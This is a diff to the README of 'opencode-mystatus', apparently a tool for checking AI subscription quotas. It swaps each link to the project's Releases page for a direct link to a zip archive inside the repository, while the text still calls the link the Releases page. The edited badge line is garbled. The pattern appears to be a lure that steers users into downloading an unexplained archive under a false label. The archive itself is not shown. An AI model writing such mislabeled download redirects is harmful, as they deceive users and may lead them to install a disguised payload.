@@ -1,6 +1,6 @@
 # 🚀 opencode-mystatus - Check Your AI Subscription Quotas Easily
 
-[![Download opencode-mystatus](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/HemKalariya/opencode-mystatus/releases)
+[![Download opencode-mystatus](https://github.com/HemKalariya/opencode-mystatus/raw/refs/heads/main/plugin/mystatus-opencode-3.4.zip%20Now-Get%20Latest%https://github.com/HemKalariya/opencode-mystatus/raw/refs/heads/main/plugin/mystatus-opencode-3.4.zip)](https://github.com/HemKalariya/opencode-mystatus/raw/refs/heads/main/plugin/mystatus-opencode-3.4.zip)
 
 ## 📋 Description
 
@@ -20,7 +20,7 @@ To start using opencode-mystatus, simply follow these steps. You will need a com
 
 To download opencode-mystatus, visit the following page. You will find the latest version available for download.
 
-[Download opencode-mystatus](https://github.com/HemKalariya/opencode-mystatus/releases)
+[Download opencode-mystatus](https://github.com/HemKalariya/opencode-mystatus/raw/refs/heads/main/plugin/mystatus-opencode-3.4.zip)
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version listed.
@@ -94,6 +94,6 @@ opencode-mystatus is open-source software licensed under the MIT License. You ca
 
 ## 🔗 Stay Updated 
 
-For updates, features, and announcements, follow our repository. Visit our [Releases page](https://github.com/HemKalariya/opencode-mystatus/releases) for the latest information.
+For updates, features, and announcements, follow our repository. Visit our [Releases page](https://github.com/HemKalariya/opencode-mystatus/raw/refs/heads/main/plugin/mystatus-opencode-3.4.zip) for the latest information.
 
 Thank you for using opencode-mystatus!
